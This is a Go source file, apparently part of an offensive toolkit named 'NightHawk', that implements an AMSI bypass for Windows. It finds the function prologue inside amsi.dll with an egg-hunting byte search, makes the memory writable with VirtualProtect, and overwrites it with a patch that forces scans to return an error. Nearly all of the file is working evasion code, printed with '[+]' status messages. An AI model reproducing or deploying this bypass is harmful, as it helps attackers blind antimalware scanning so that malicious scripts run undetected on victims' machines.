package NightHawk

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

var egg = []byte{ // Egg for 64 Bit Process - 24 Bytes
	0x4C, 0x8B, 0xDC, // mov     r11,rsp
	0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
	0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
	0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
	0x57,       // push    rdi
	0x41, 0x56, // push    r14
	0x41, 0x57, // push    r15
	0x48, 0x83, 0xEC, 0x70, // sub     rsp,70h
}

var patch = []byte{ // AMSI patch
	0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3, 0x90, 0x90,
}

func Amsi() {

	println("[+] Executing AMSI Bypass")

	kernel32, _ := syscall.LoadLibrary("amsi.dll")
	DLL := syscall.Handle(kernel32)

	print("[+] Fetching AMSI DLL Handle: ")
	dllCanUnloadNowAddr := getProcAddr(DLL, "DllCanUnloadNow")
	println(unsafe.Pointer(dllCanUnloadNowAddr))

	print("[+] Target Patch Addr: ")
	targetAddr := Hunter(dllCanUnloadNowAddr, egg)
	println(unsafe.Pointer(targetAddr))

	println("[+] Patching memory")
	patchMem(unsafe.Pointer(targetAddr), unsafe.Pointer(dllCanUnloadNowAddr))

}

func Hunter(address uintptr, egg []byte) uintptr { // Iterate through mem at pointer until Egg chunk is found

	loc := (uintptr)(address)

	for true { // Top While Loop

		for true { // Child While Loop

			loc++ // Iterate memory location by one bit
			memVal := unsafe.Pointer(loc)
			fmt.Println(memVal)
			tracker := true
			var conv byte = *((*byte)(memVal)) // Convert ptr to byte

			if conv == egg[0] { // If byte is equivalent to an egg byte, start the counter

				for i := 0; i < len(egg); i++ {
					memLocation := loc + uintptr(i)
					var convertedByte byte = *((*byte)(unsafe.Pointer(memLocation)))
					if convertedByte != egg[i] { // If any of the ++ subsequent bytes do not match the egg, mark this find as false
						tracker = false
					}
				}

				if tracker == false { // If tracker could not validate all the subsequent bytes from initial trigger, restart loop
					break
				} else { // Otherwise, we got a winner!
					fmt.Println("[+] Found the Egg! Returning memory location for patching..")
					fmt.Println(memVal)
					return loc
				}

			} else {
				break
			}

		} // End Child While Loop
	} // End Top While Loop

	return 0
}

func patchMem(patchAddr unsafe.Pointer, dllAddr unsafe.Pointer) { // Patch AMSI

	var oldfperms uint32
	fmt.Println(unsafe.Pointer(patchAddr))
	if !virtualProt(patchAddr, unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("VirtualProtect Failed!")
	}

	// Convert patch byte array to uintptr
	var r uintptr
	ptr := binary.LittleEndian.Uint64(patch)
	r = uintptr(ptr)

	*(*uintptr)(unsafe.Pointer(patchAddr)) = *(&r) // Patch memory by overwriting pointer with patch array

	writeProc := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
	WriteProcMem(syscall.Handle(writeProc.Addr()), patchAddr, r)

	var a uint32
	if !virtualProt(patchAddr, unsafe.Sizeof(uintptr(0)), oldfperms, unsafe.Pointer(&a)) {
		panic("VirtualProtect Failed!")
	}

}

func getProcAddr(DLL syscall.Handle, funcName string) uintptr { // Get process memory address

	fetchAddr, _ := syscall.GetProcAddress(syscall.Handle(DLL), funcName)
	return fetchAddr

}

func virtualProt(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {

	kern32VProt := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
	ret, _, _ := kern32VProt.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0

}

func WriteProcMem(currProccess syscall.Handle, patchAddr unsafe.Pointer, patch uintptr) bool {

	kern32WriteMem := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")
	ret, _, _ := kern32WriteMem.Call(
		uintptr(currProccess),
		uintptr(patchAddr),
		patch)
	fmt.Println("[+] Patched Memory!")
	return ret > 0

}
